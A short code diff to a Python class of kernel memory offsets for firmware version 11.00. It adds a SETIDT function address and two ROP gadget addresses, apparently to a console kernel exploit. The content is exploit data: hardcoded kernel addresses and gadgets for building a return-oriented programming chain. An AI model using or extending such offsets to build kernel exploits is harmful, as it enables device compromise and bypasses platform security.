@@ -649,6 +649,7 @@ class OffsetsFirmware_1100:
 
     KERNEL_MAP = 0xffffffff843ff130
 
+    SETIDT = 0xffffffff8245bdb0
     KMEM_ALLOC = 0xffffffff82445e10
     MEMCPY = 0xffffffff824dddf0
     VM_MAP_PROTECT = 0xffffffff8255c710
@@ -666,6 +667,12 @@ class OffsetsFirmware_1100:
 
     # 0xffffffff8293c8c6 : lea rsp, [rsi + 0x20] ; repz ret
     LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8293c8c6
+
+    # 0xffffffff826cb2da : add rsp, 0x28 ; pop rbp ; ret
+    ADD_RSP_28_POP_RBP_RET = 0xffffffff826cb2da
+
+    # ud2 ; mov eax, 1 ; ret
+    UD2_MOV_EAX_1_RET = 0xffffffff824f12a5
 
     # 0xffffffff824cdd5f : add rsp, 0xb0 ; pop rbp ; ret
     ADD_RSP_B0_POP_RBP_RET = 0xffffffff824cdd5f
